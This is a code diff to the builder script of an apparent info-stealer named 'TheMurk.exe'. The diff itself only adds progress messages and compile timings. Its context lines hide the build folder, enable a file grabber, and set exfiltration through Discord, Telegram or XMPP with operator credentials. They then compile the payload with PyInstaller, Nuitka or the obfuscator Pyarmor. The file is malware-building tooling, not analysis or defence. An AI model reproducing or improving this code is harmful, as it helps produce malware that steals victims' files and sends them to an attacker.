@@ -144,8 +144,11 @@ class Builder():
         shutil.move('buildingCache/',temp)
         win32api.SetFileAttributes(temp + os.sep + 'buildingCache/', win32con.FILE_ATTRIBUTE_HIDDEN)
         
+        print("\033[33m{}\033[0m".format("\n\n(i) Reading vars..."))
         with open(temp + os.sep + 'buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/config/config.py', 'r') as f:
             data = f.read()
+
+        print("\033[33m{}\033[0m".format("\n\n(i) Changing vars..."))
 
         if self.fileGrab == "Y" or self.fileGrab == "y":
             data = data.replace('enableFileGrabber = False #enable file grabber', 'enableFileGrabber = True')
@@ -172,6 +175,8 @@ class Builder():
             data = data.replace("sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP","sendType = 2")
             data = data.replace('xmppData = ["jabberid","jabberpassword","jabberreceiver"]',f'xmppData = ["{self.jabberid}","{self.jabberpassword}","{self.jabberreceiver}"]')
 
+        print("\033[33m{}\033[0m".format("\n\n(i) Writing vars..."))
+
         with open(temp + os.sep + 'buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/config/config.py', 'w') as file:
             file.write(data)
 
@@ -179,16 +184,21 @@ class Builder():
         fullPath = fullPath.replace('\\Modules.zip', '')
 
         os.chdir(temp + os.sep + 'buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/')
+        print("\033[33m{}\033[0m".format("\n\n(i) Compiling..."))
         if self.builder == "Nuitka":
+            self.time = 120
             os.system('start CompileNuitka.bat')
         if self.builder == "Pyinstaller":
+            self.time = 5
             os.system('start CompilePyinstaller.bat')
         if self.builder == "Pyarmor":
+            self.time = 30
             os.system('start CompilePyarmor.bat')
         while not os.path.exists("TheMurk.exe") and not os.path.exists("dist/TheMurk.exe"):
            pass
 
         if os.path.exists("TheMurk.exe") or os.path.exists("dist/TheMurk.exe"):
+            print("\033[33m{}\033[0m".format("\n\n(i) Ending..."))
             time.sleep(60)
             os.chdir(f'{fullPath}')
             try:
@@ -196,8 +206,8 @@ class Builder():
             except:
                 shutil.move(temp + os.sep + "buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/dist/TheMurk.exe", fullPath)
         shutil.rmtree(temp + os.sep + 'buildingCache/', ignore_errors=True)
-        print("\033[33m{}\033[0m".format("(i) done"))   
-        input("\033[33m{}\033[0m".format("(i) exit on enter..."))
+        print("\033[33m{}\033[0m".format("(i) Done"))
+        input("\033[33m{}\033[0m".format("(i) Exit on enter..."))
 
 if __name__ == "__main__":
     Builder()
